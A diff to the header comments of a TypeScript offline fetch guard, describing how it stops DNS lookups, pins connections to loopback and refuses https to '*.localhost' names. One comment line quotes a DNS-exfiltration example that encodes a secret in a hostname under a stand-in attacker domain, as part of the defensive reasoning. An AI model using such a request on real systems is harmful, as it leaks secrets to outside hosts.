@@ -15,9 +15,15 @@
  * Test seams are unchanged: a module given an explicit `fetchImpl`/transport uses it directly and
  * never reaches `trentFetch`, so the injected-fetch tests keep asserting exact request behaviour.
  *
- * [D3] Pinning. `assertLocalTarget` resolves the name once and returns the loopback address it
- * validated; the dial then connects to THAT literal, so the platform `fetch` has no name to resolve a
- * second time and a rebinding DNS answer never reaches the connect. The mechanism has to be
+ * No DNS offline. A resolver query is itself egress: `fetch("http://<secret>.attacker.tld/")` would
+ * leak through the query name even though the connect is refused. So offline `assertLocalTarget`
+ * never resolves a name: an IP literal is checked as written, `localhost` / `*.localhost` are loopback
+ * by definition (RFC 6761), an `allowedHosts` entry passes as written, and any other name is refused
+ * before a resolver is asked.
+ *
+ * [D3] Pinning. `assertLocalTarget` returns the loopback address it validated (127.0.0.1 for a
+ * `*.localhost` name); the dial then connects to THAT literal, so the platform `fetch` has no name to
+ * resolve and a system resolver that would forward `*.localhost` upstream is never asked. The mechanism has to be
  * runtime-agnostic too (no undici dispatcher: Bun's native fetch ignores it, and undici is not a
  * dependency of this package), so the URL's host is rewritten to the pinned literal and the original
  * authority goes in the `Host` header:
@@ -25,8 +31,9 @@
  *   - Node's fetch (undici) drops a caller-set `Host` as a forbidden header, so under Node the server
  *     sees the literal (`127.0.0.1:11434`). The connect is still pinned; only name-based virtual
  *     hosting on a loopback server is lost, which local model runtimes do not use.
- *   - https to a DNS name is REFUSED offline: rewriting it to a literal would break certificate and
- *     SNI checks, and fetch gives no portable way to pin the address while keeping the name for TLS.
+ *   - https to a `*.localhost` name is REFUSED offline: rewriting it to a literal would break
+ *     certificate and SNI checks, and fetch gives no portable way to pin the address while keeping
+ *     the name for TLS.
  *     Use `http://127.0.0.1:…` or list the host in `allowedHosts`.
  * Not pinned (documented residuals): the name `localhost` (answered from the hosts file, not DNS), a
  * loopback literal (no DNS at all), and an `allowedHosts` entry, which the operator vouched for and
@@ -45,7 +52,7 @@ export interface TrentFetchOptions {
    * threads the configured local base URL through here; this wave keeps the loopback-only default.
    */
   readonly allowedHosts?: readonly string[];
-  /** Injectable resolver for the offline guard's single resolution. Defaults to `dns.promises.lookup`. */
+  /** Accepted and never called: offline no name is resolved (see the module header). Tests count it at zero. */
   readonly lookup?: LookupFn;
 }
 
